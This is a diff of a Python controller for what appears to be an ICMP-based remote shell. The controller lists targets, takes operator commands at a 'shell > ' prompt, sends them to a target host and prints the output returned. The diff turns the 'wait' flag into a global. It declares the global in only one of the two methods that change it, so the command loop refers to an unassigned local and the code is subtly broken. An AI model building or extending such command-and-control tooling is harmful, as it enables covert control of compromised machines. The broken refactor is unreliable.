@@ -13,7 +13,7 @@ import time
 import argparse
 from multiprocessing import Process, Manager
 
-
+wait = False
 
 TTL = int(64)
 ICMP_ID = int(12800)
@@ -24,7 +24,6 @@ class Controller(Host):
         super().__init__()
         self.db = TinyDB('./db.json')
         self.mock_stdout = ""
-        self.wait = False
 
     def list_hosts(self):
         response = "[ Targets ]\n"
@@ -48,27 +47,28 @@ class Controller(Host):
         sniffer.start()
 
         while True:
-            if not self.wait:
+            if not wait:
                 cmd = input(colored("shell > ", "red")).encode()
                 if len(cmd) != 0:
                     self.send(target['ip'], "instruction", cmd)
-                    self.wait = True
+                    wait = True
 
     def instruction(self, shellpack):
-        
+        global wait
+
         if shellpack['option'] == "TRUNCATED":
             self.mock_stdout += shellpack['data'].decode()
         elif shellpack['option'] == "COMPLETE":
             self.mock_stdout += shellpack['data'].decode()
             print(self.mock_stdout)
             self.mock_stdout = ""
-            self.wait = False
+            wait = False
         elif shellpack['option'] == "ERROR":
             print(f"[ERROR] {shellpack['data'].decode()}")
-            self.wait = False
+            wait = False
         else:
             print(f"{shellpack['data'].decode()}")
-            self.wait = False
+            wait = False
         
 
 if __name__ == "__main__":
